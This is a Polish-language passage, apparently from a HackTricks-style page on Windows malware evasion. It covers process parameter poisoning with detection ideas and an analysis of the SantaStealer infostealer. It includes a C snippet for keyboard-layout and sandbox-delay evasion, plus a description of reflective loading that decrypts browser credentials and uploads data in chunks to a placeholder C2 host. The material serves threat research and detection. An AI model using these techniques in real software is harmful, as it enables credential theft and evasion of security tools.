Następnie second stage może zostać skopiowany ze stosu do alokacji `PAGE_READWRITE`, przełączony na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i uruchomiony przez skok, co pozwala uniknąć bezpośredniej alokacji RWX.

### Pomysły dotyczące detekcji

Dobre możliwości huntingu wymienione przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` ustawiające strony parametrów procesu jako wykonywalne
- zmiana ochrony, po której następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **technika transferu między procesami**, a nie pełna primitive execution sama w sobie: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- `RtlCreateProcessReflection` / Dirty Vanity było rozważane przez autorów, ale zostało odrzucone, ponieważ wewnętrznie korzysta z podejrzanych primitives, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Tradecraft SantaStealer na potrzeby Fileless Evasion i Credential Theft

SantaStealer (znany również jako BluelineStealer) pokazuje, jak współczesne info-stealery łączą AV bypass, anti-analysis i dostęp do poświadczeń w jednym workflow.<sup>[[24]](#references)</sup>

### Weryfikacja układu klawiatury i opóźnienie sandboxa

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli zostanie znaleziony układ cyrylicy, sample tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nigdy nie detonuje się w wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt przydatny w hun­t­ingu.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, hashuje każdą nazwę za pomocą niestandardowej sumy kontrolnej kroczącej i porównuje ją z wbudowanymi blocklistami debuggerów/sandboxów; powtarza sumowanie dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B analizuje właściwości systemu (minimalną liczbę procesów, niedawny czas działania), wywołuje `OpenServiceA("VBoxGuest")` w celu wykrycia dodatków VirtualBox oraz wykonuje kontrole czasu wokół uśpienia, aby wykryć single-stepping. Każde trafienie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + double ChaCha20 reflective loading

- Główny DLL/EXE zawiera Chromium credential helper, który jest zapisywany na dysku albo mapowany ręcznie w pamięci; w trybie fileless samodzielnie rozwiązuje imports/relocations, dzięki czemu na dysku nie są zapisywane żadne artefakty helpera.
- Helper przechowuje DLL drugiego etapu, dwukrotnie zaszyfrowany za pomocą ChaCha20 (dwa klucze 32-bajtowe + 12-bajtowe nonce). Po obu przebiegach refleksyjnie ładuje blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, wywodzące się z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator używają direct-syscall reflective process hollowing do wstrzyknięcia kodu do aktywnego browsera Chromium, dziedziczą klucze AppBound Encryption i odszyfrowują hasła, cookies oraz dane kart płatniczych bezpośrednio z baz SQLite, pomimo hardeningu ABE.


### Modularne zbieranie danych w pamięci i chunked HTTP exfil

- `create_memory_based_log` iteruje po globalnej tabeli wskaźników funkcji `memory_generators` i tworzy po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, screenshots, dokumenty, browser extensions itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i raportuje liczbę plików po około 45-sekundowym oknie oczekiwania na zakończenie.
- Po zakończeniu wszystkie dane są pakowane za pomocą statycznie linkowanej biblioteki `miniz` jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` czeka 15 sekund i przesyła archiwum w kawałkach po 10 MB za pomocą HTTP POST do `http://<C2>:6767/upload`, podszywając się pod boundary przeglądarki `multipart/form-data` (`----WebKitFormBoundary***`). Do każdego kawałka dodawane są `User-Agent: upload`, `auth: <build_id>`, opcjonalnie `w: <campaign_tag>`, a do ostatniego kawałka dopisywane jest `complete: true`, aby C2 wiedział, że ponowne składanie zostało zakończone.

## References

- [1] [Zaawansowane techniki unikania wykrycia: precyzyjne module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stosy wywołań, koniec z bezkarnością malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacja](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – przykład](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – przykład](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – spoofing stosu wywołań PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nowy łańcuch infekcji i zaciemnianie oparte na ConfuserEx w DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Czy należy ufać zero trust? Omijanie kontroli stanu Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: nadużywanie przekazywanych eksportów](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inwentarz przekazywanych eksportów Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – kolejność wyszukiwania bibliotek dynamicznie linkowanych](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – bezpieczeństwo procesów i prawa dostępu](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – dokumentacja EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – przeciwdziałanie EDR-om za pomocą Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – przełamywanie warstwy ochronnej Windows Defender za pomocą techniki przekierowania folderu](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – dokumentacja polecenia mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: od RAT-a przez builder do codera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer nadchodzi: nowy, ambitny infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – odszyfrowywanie Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: pokonywanie malware Node.js za pomocą API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: usypianie Adaptix za pomocą Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – zatruwanie parametrów procesu](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET i spoofing stosu](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuskacja uśpienia Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – ukrywanie Dotnet ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – nadużywanie Chrome Remote Desktop podczas operacji Red Team: praktyczny przewodnik](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: wykorzystanie sterownika naprawczego Defendera jako kernellowego prymitywu operacyjnego](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
